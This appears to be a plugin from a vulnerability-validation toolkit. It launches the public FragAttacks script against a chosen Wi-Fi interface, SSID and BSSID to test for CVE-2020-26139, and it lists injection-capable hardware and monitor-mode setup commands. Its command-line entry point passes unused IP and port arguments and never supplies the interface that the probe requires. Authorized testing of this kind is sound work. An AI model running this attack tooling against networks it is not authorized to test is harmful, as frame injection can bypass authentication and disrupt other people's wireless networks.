#!/usr/bin/env python3
"""CVE-2020-26139 – FragAttacks: EAPOL frame authentication bypass.

Public PoC source: https://github.com/vanhoefm/fragattacks
  research/fragattack.py (Mathy Vanhoef, 2020)
  Command: fragattack.py --inject-control-to-client

Dependencies:
  - Patched mac80211 / hostapd from fragattacks/research/
  - Python3 + scapy, libwifi
  - Wireless interface in monitor mode (iw dev <iface> set monitor none)
"""
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 40,
    "cve": "CVE-2020-26139",
    "year": 2020,
    "domain": "wireless",
    "vendor_product": "IEEE 802.11 Wi-Fi implementations (FragAttacks)",
    "component": "Wi-Fi fragmentation/aggregation handling",
    "type": "Frame injection / authentication bypass",
    "summary": "EAPOL frame authentication bypass",
    "source_url": "https://github.com/vanhoefm/fragattacks",
    "requires_manual_review": True,
    "affected": [{"vendor": "Multiple", "product": "802.11 clients/APs",
                  "versions": [{"version": "pre-2021-05 patch", "status": "affected"}
]}],
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['IEEE 802.11 无线网卡（支持 monitor mode + 帧注入）', '推荐：Alfa AWUS036ACHM / TP-Link AC600'],
    "connection": 'USB WiFi（wlan0mon）',
    "tools":      ['fragattack 框架（https://github.com/vanhoefm/fragattacks）', 'hostapd ≥ 2.9 实验版', 'libwifi'],
    "firmware":   '需为网卡刷入支持帧注入的固件（Ath9k / mt76 / mac80211）',
    "setup":      'sudo airmon-ng start wlan0 && sudo python3 fragattacks.py wlan0mon',
}


FRAG_REPO   = Path(__file__).parent.parent.parent / "public_poc_sources/repos/vanhoefm__fragattacks"
FRAG_SCRIPT = FRAG_REPO / "research/fragattack.py"


def _run_poc(plugin):
    iface   = (plugin.params or {}).get("interface", "wlan0mon")
    target  = (plugin.params or {}).get("target_bssid", "")
    ssid    = (plugin.params or {}).get("ssid", "")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2020-26139",
        "fragattack_script": str(FRAG_SCRIPT),
        "script_present": FRAG_SCRIPT.exists(),
        "cmd_hint": "fragattack.py --inject-control-to-client",
    }

    if allow_disruptive and FRAG_SCRIPT.exists() and iface:
        cmd_parts = ["sudo", "python3", str(FRAG_SCRIPT), iface]
        if ssid:   cmd_parts += ["--ssid", ssid]
        if target: cmd_parts += ["--bssid", target]
        evidence["command"] = " ".join(cmd_parts)
        try:
            proc = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=90)
            evidence["rc"]     = proc.returncode
            evidence["stdout"] = proc.stdout[:800]
            evidence["stderr"] = proc.stderr[:400]
            evidence["vulnerable"] = ("VULNERABLE" in proc.stdout or
                                       "INJECT" in proc.stdout.upper())
        except subprocess.TimeoutExpired:
            evidence["detail"] = "Test timed out."
        except Exception as exc:
            evidence["detail"] = str(exc)
    else:
        evidence["detail"] = (
            "Supply interface= (monitor mode), ssid=, allow_disruptive=true. "
            "Ensure patched drivers are loaded per fragattacks/research/README."
        )

    return {
        "vulnerable": evidence.get("vulnerable"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "vanhoefm/fragattacks / research/fragattack.py",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc73Cve202026139FragAttacksInjectionAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50"
    meta_display_id = "POC-WIRELESS-073"
    meta_poc_name   = 'CVE-2020-26139 FragAttacks EAPOL frame 认证绕过 Active Validation'
    meta_cve_id     = "CVE-2020-26139"
    meta_severity   = "High"
    meta_protocol   = "wifi"
    meta_target_os  = ["linux", "embedded"]
    meta_required_params = ["interface"]
    meta_optional_params = ["ssid", "target_bssid", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/vanhoefm/fragattacks"
    meta_references       = ['https://github.com/vanhoefm/fragattacks']
    meta_attack_surface = "Unauthenticated EAPOL frame forwarded to AP, bypassing authentication"
    is_disruptive   = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        return bool((self.params or {}).get("interface"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "73_Poc_802_11_Wi_Fi_implementations_Fragmentation_Aggregation_Audit") if "VULN" in dir() else "73_Poc_802_11_Wi_Fi_implementations_Fragmentation_Aggregation_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc73Cve202026139FragAttacksInjectionAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
